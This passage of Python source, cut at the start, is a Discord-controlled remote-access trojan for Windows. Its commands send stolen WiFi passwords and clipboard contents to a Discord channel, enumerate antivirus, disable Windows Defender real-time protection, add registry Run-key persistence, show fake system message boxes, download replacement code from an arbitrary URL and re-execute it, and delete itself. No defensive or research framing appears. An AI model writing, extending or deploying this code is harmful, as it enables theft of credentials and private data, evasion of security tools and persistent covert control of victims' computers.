            output_file = io.BytesIO(output.encode())
            await ctx.send(file=discord.File(output_file, filename="wifi_passwords.txt"))
        else:
            await ctx.send("❌ No WiFi profiles found")
            
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="clipboard")
async def clipboard(ctx):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        result = subprocess.run(
            ["powershell", "-Command", "Get-Clipboard"],
            capture_output=True,
            text=True
        )
        
        clipboard_content = result.stdout.strip()
        
        if clipboard_content:
            if len(clipboard_content) > 1900:
                output_file = io.BytesIO(clipboard_content.encode())
                await ctx.send(file=discord.File(output_file, filename="clipboard.txt"))
            else:
                await ctx.send(f"```\n{clipboard_content}\n```")
        else:
            await ctx.send("❌ Clipboard is empty")
            
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="volume")
async def volume(ctx, level: int):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        if not 0 <= level <= 100:
            await ctx.send("❌ Volume must be between 0 and 100")
            return
        
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(level / 100, None)
        
        await ctx.send(f"🔊 Volume set to {level}%")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="message")
async def message(ctx, *, text: str):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        ctypes.windll.user32.MessageBoxW(0, text, "System Message", 0x40)
        await ctx.send("✅ Message displayed")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="antivirus")
async def antivirus(ctx):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        result = subprocess.run(
            ["wmic", "/Node:localhost", "/Namespace:\\\\root\\SecurityCenter2", "Path", "AntiVirusProduct", "Get", "displayName"],
            capture_output=True,
            text=True
        )
        
        output = result.stdout.strip()
        await ctx.send(f"```\n🛡️ Antivirus Software:\n{output}\n```")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="defender")
async def defender(ctx, action: str):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        if action == "disable":
            subprocess.run(
                ["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"],
                capture_output=True
            )
            await ctx.send("✅ Windows Defender real-time protection disabled")
        
        elif action == "enable":
            subprocess.run(
                ["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $false"],
                capture_output=True
            )
            await ctx.send("✅ Windows Defender real-time protection enabled")
        
        else:
            await ctx.send("Usage: `!defender [disable|enable]`")
            
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)} (May require admin privileges)")

@bot.command(name="startup")
async def startup(ctx, action: str):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        script_path = os.path.abspath(__file__)
        app_name = "DiscordBot"
        
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        if action == "enable":
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, f'"{script_path}"')
            winreg.CloseKey(key)
            await ctx.send("✅ Startup persistence enabled")
        
        elif action == "disable":
            try:
                winreg.DeleteValue(key, app_name)
                await ctx.send("✅ Startup persistence disabled")
            except:
                await ctx.send("⚠️ Startup entry not found")
            winreg.CloseKey(key)
        
        else:
            await ctx.send("Usage: `!startup [enable|disable]`")
            
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="reconnect")
async def reconnect(ctx):
    if str(ctx.author.id) != config["owner"]:
        return
    
    await ctx.send("🔄 Reconnecting...")
    await bot.close()

@bot.command(name="update")
async def update(ctx, url: str):
    if str(ctx.author.id) != config["owner"]:
        return
    
    try:
        response = requests.get(url, timeout=30)
        response.raise_for_status()
        
        script_path = os.path.abspath(__file__)
        
        with open(script_path, 'wb') as f:
            f.write(response.content)
        
        await ctx.send("✅ Bot updated! Restarting...")
        os.execv(sys.executable, ['python'] + sys.argv)
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name="uninstall")
async def uninstall(ctx):
    if str(ctx.author.id) != config["owner"]:
        return
    
    await ctx.send("⚠️ Uninstalling bot...")
    
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        try:
            winreg.DeleteValue(key, "DiscordBot")
        except:
            pass
        winreg.CloseKey(key)
    except:
        pass
    
    script_path = os.path.abspath(__file__)
    os.remove(script_path)

if __name__ == "__main__":
    print("Starting Discord bot...")
    print(f"PC Username: {get_pc_username()}")
    bot.run(config["token"])
